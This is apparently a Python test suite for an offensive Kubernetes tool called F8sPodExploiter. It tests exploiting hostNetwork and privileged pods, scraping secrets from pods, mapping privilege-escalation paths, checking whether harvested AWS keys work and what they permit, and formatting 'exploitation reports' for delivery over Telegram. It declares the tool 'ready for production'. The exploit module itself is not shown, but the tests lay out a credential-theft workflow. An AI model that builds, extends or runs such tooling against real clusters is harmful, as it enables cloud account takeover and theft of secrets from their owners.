#!/usr/bin/env python3
"""
Test script for F8sPodExploiter functionality
Validates core methods and integration patterns
Author: wKayaa | Test Version | 2025-06-24
"""

import asyncio
import json
import sys
import os
from datetime import datetime

# Add current directory to path to import f8s_exploit_pod
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from f8s_exploit_pod import F8sPodExploiter, ExploitSeverity, SecretType, ExploitResult
    print("✅ F8sPodExploiter imported successfully")
except ImportError as e:
    print(f"❌ Failed to import F8sPodExploiter: {e}")
    sys.exit(1)

async def test_pod_exploiter_initialization():
    """Test basic initialization"""
    print("\n🧪 Testing F8sPodExploiter initialization...")
    
    exploiter = F8sPodExploiter()
    
    assert exploiter.session_id is not None
    assert len(exploiter.session_id) == 8
    assert exploiter.stats['pods_scanned'] == 0
    assert len(exploiter.secret_patterns) > 0
    assert len(exploiter.target_paths) > 0
    
    print("✅ Initialization test passed")

async def test_hostnetwork_exploitation():
    """Test hostNetwork exploitation"""
    print("\n🧪 Testing hostNetwork exploitation...")
    
    exploiter = F8sPodExploiter()
    
    # Test pod with hostNetwork enabled
    pod_spec_vulnerable = {
        'metadata': {'name': 'test-pod'},
        'spec': {
            'hostNetwork': True,
            'hostPID': True,
            'containers': [{
                'name': 'test-container',
                'securityContext': {
                    'privileged': True,
                    'capabilities': {'add': ['SYS_ADMIN', 'NET_ADMIN']}
                }
            }]
        }
    }
    
    result = await exploiter.exploit_hostnetwork(pod_spec_vulnerable)
    
    assert result.success == True
    assert result.severity == ExploitSeverity.HIGH
    assert result.method == "hostNetwork_exploitation"
    assert len(result.escalation_paths) > 0
    assert 'network_info' in result.details
    
    # Test pod without hostNetwork
    pod_spec_safe = {
        'metadata': {'name': 'safe-pod'},
        'spec': {'hostNetwork': False}
    }
    
    result_safe = await exploiter.exploit_hostnetwork(pod_spec_safe)
    assert result_safe.success == False
    
    print("✅ hostNetwork exploitation test passed")

async def test_secret_scraping():
    """Test secret scraping functionality"""
    print("\n🧪 Testing secret scraping...")
    
    exploiter = F8sPodExploiter()
    
    secrets = await exploiter.scrape_secrets("test-pod", "default")
    
    assert isinstance(secrets, list)
    assert len(secrets) > 0
    
    # Check for different secret types
    secret_types = {secret.secret_type for secret in secrets}
    assert SecretType.AWS_ACCESS_KEY in secret_types or SecretType.API_KEY in secret_types
    
    # Validate secret structure
    for secret in secrets:
        assert hasattr(secret, 'secret_type')
        assert hasattr(secret, 'value')
        assert hasattr(secret, 'source_location')
        assert hasattr(secret, 'confidence')
        assert 0 <= secret.confidence <= 1
    
    print(f"✅ Secret scraping test passed - found {len(secrets)} secrets")

async def test_privilege_escalation_check():
    """Test privilege escalation detection"""
    print("\n🧪 Testing privilege escalation check...")
    
    exploiter = F8sPodExploiter()
    
    # Test with mock cluster endpoint
    cluster_endpoint = "https://kubernetes.default.svc"
    
    escalation_paths = await exploiter.check_privilege_escalation(cluster_endpoint)
    
    assert isinstance(escalation_paths, list)
    # Should find at least service account token escalation path
    assert len(escalation_paths) >= 1
    
    # Validate escalation path structure
    for path in escalation_paths:
        assert hasattr(path, 'method')
        assert hasattr(path, 'target')
        assert hasattr(path, 'success_probability')
        assert hasattr(path, 'impact')
        assert 0 <= path.success_probability <= 1
        assert isinstance(path.impact, ExploitSeverity)
    
    print(f"✅ Privilege escalation test passed - found {len(escalation_paths)} paths")

async def test_aws_credential_validation():
    """Test AWS credential validation"""
    print("\n🧪 Testing AWS credential validation...")
    
    exploiter = F8sPodExploiter()
    
    # Test valid format credentials
    valid_creds = {
        'access_key': 'AKIA1234567890EXAMPLE',
        'secret_key': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
    }
    
    result = await exploiter.validate_aws_credentials(valid_creds)
    
    assert result.service == "aws"
    assert result.valid == True
    assert len(result.permissions) > 0
    assert len(result.regions) > 0
    assert 'account_info' in result.__dict__
    
    # Test invalid credentials
    invalid_creds = {
        'access_key': 'INVALID',
        'secret_key': 'INVALID'
    }
    
    invalid_result = await exploiter.validate_aws_credentials(invalid_creds)
    assert invalid_result.valid == False
    
    print("✅ AWS credential validation test passed")

async def test_telegram_message_formatting():
    """Test Telegram message formatting"""
    print("\n🧪 Testing Telegram message formatting...")
    
    exploiter = F8sPodExploiter()
    
    # Update stats for testing
    exploiter.stats.update({
        'pods_scanned': 5,
        'vulnerabilities_found': 3,
        'secrets_extracted': 8,
        'secrets_validated': 2
    })
    
    test_results = {
        'target': 'test-cluster.example.com',
        'vulnerabilities': [
            {'method': 'hostNetwork_exploitation', 'severity': 'HIGH'},
            {'method': 'privileged_container', 'severity': 'CRITICAL'}
        ],
        'secrets': [
            {'type': 'aws_access_key', 'source': 'env'},
            {'type': 'api_key', 'source': 'volume'}
        ],
        'aws_validation': {
            'valid': True,
            'account_info': {'account_id': '123456789012'},
            'permissions': ['ec2:DescribeInstances', 's3:ListBucket'],
            'regions': ['us-east-1', 'us-west-2']
        }
    }
    
    message = exploiter._format_telegram_message(test_results)
    
    assert isinstance(message, str)
    assert len(message) > 100
    assert 'F8S Pod Exploitation Report' in message
    assert exploiter.session_id in message
    assert 'test-cluster.example.com' in message
    assert 'Pods Scanned: 5' in message
    assert 'AWS Account Validated' in message
    
    print("✅ Telegram message formatting test passed")

async def test_integration_helpers():
    """Test integration helper functions"""
    print("\n🧪 Testing integration helpers...")
    
    exploiter = F8sPodExploiter()
    
    # Test K8sExploitMaster integration
    mock_k8s_results = {
        'exploited_clusters': [
            {'endpoint': 'https://cluster1.example.com'},
            {'endpoint': 'https://cluster2.example.com'}
        ]
    }
    
    # Import integration function
    from f8s_exploit_pod import integrate_with_k8s_exploit_master
    
    integration_result = await integrate_with_k8s_exploit_master(exploiter, mock_k8s_results)
    
    assert 'f8s_session' in integration_result
    assert integration_result['f8s_session'] == exploiter.session_id
    assert 'k8s_master_data' in integration_result
    assert 'f8s_enhanced_results' in integration_result
    
    print("✅ Integration helpers test passed")

async def test_cleanup_functionality():
    """Test cleanup functionality"""
    print("\n🧪 Testing cleanup functionality...")
    
    exploiter = F8sPodExploiter()
    
    # Test cleanup (will fail gracefully since no real resources exist)
    cleanup_result = await exploiter.cleanup_resources("https://test-cluster.example.com")
    
    # Should return boolean
    assert isinstance(cleanup_result, bool)
    
    print("✅ Cleanup functionality test passed")

async def run_comprehensive_test():
    """Run comprehensive test of F8sPodExploiter"""
    print("\n🧪 Running comprehensive F8sPodExploiter test...")
    
    exploiter = F8sPodExploiter()
    
    # This will fail gracefully with mock data
    results = await exploiter.run_comprehensive_exploitation(
        cluster_endpoint="https://test-cluster.example.com",
        target_pods=["test-pod-1", "test-pod-2"]
    )
    
    assert isinstance(results, dict)
    assert 'session_id' in results
    assert 'target' in results
    assert 'statistics' in results
    assert results['session_id'] == exploiter.session_id
    
    print("✅ Comprehensive test passed")

async def main():
    """Main test execution"""
    print("🚀 F8sPodExploiter Test Suite")
    print("=" * 50)
    
    tests = [
        test_pod_exploiter_initialization,
        test_hostnetwork_exploitation,
        test_secret_scraping,
        test_privilege_escalation_check,
        test_aws_credential_validation,
        test_telegram_message_formatting,
        test_integration_helpers,
        test_cleanup_functionality,
        run_comprehensive_test
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            await test()
            passed += 1
        except Exception as e:
            print(f"❌ Test {test.__name__} failed: {e}")
            failed += 1
    
    print("\n" + "=" * 50)
    print(f"🎯 Test Results: {passed} passed, {failed} failed")
    
    if failed == 0:
        print("✅ All tests passed! F8sPodExploiter is ready for production.")
        return True
    else:
        print("❌ Some tests failed. Please review the implementation.")
        return False

if __name__ == "__main__":
    try:
        success = asyncio.run(main())
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n⏹️ Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Test suite failed: {e}")
        sys.exit(1)